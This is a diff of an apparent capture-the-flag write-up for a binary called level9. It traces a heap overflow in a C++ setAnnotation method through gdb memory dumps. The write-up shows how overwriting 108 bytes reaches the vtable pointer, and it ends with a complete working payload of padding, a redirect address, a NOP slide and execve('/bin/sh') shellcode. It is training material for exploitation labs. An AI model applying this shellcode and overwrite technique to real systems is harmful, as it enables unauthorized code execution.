@@ -1,44 +1,50 @@
+There is an memcpy with argv[1]
+If we pass too much character is segfault
+
 disas _ZN1N13setAnnotationEPc
+b*0x08048733 ( memcpy )
+(gdb) run $(python -c 'print "A" * 60')
 
-we can see that there is an strcpy from our av[1] to a location
+(gdb) b*_ZN1N13setAnnotationEPc
+(gdb) x/10wx $esp
+0xbffff64c:	0x0804867c	0x0804a008	0xbffff85f	0xbffff720
+First addr = object himself
+second = destination
+three = our 'A'
 
-there is no check for the strcpy so we can make it segfault
+(gdb) b*0x08048733 (memcpy)
+(gdb) c
+(gdb) x/x $edx 
+0x804a00c:	0x00000000
 
-if we segfault (with more than 108 character )
-we can see that we overwrite EAX and the stack
+Which is our destination for memcpy, let's explore this
 
-It then  0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
+(gdb) x/30x 0x804a00c
+0x804a00c:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a01c:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a02c:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a03c:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a04c:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a05c:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a06c:	0x00000000	0x00000005	0x00000071	0x08048848
+0x804a07c:	0x00000000	0x00000000
 
-load what is at address [eax] into edx
+We can see that if we overwrite 108 bytes the next 4 bytes will overwrite the
+VPTR table '0x08048848'
 
-it then call edx later.
+We will redirect this to a shellcode instead of his current ptr func.
 
-If we can control eax we can call whatever we want.
-
-
-we can exploit like this "A" * 108 + <new EAX addr> + what we can to execute
-
-
-b*   0x08048693 <+159>:	call   edx
-
+Let's see what the current addr of the stack when we call edx with a normal
+execution
+(gdb) b*0x08048693 (call edx)
 (gdb) run $(python -c 'print "A" * 108')
+(gdb) p $esp
+$7 = (void *) 0xbffff650
+(gdb) x/20wx 0xbffff650
+0xbffff650:	0x0804a078
 
-info registers
-x/20wx $esp
+Great we can use `0x0804a078` to store our shellcode
 
-we can see that esp is starting at 0804a078
+Final payload, i've added an nop slide because sometime the stack mess up
 
-so if we do not overwrite that's where we appear on stack at this moment
-
-lets write to this addr
-
-\x90 is just NOP slide
-https://c9x.me/x86/html/file_module_x86_id_217.html
-it does nothing
-since stack maaybe be variable i sometime use this
-
-then there is just a shell code who call system('/bin/sh');
-
-$(python -c 'print "A" * 108 +"\x78\xa0\x04\x08" + "\x90" *
-100+"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
-
+./level9 $(python -c 'print "A" * 108 +"\x78\xa0\x04\x08" + "\x90" * 100+"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
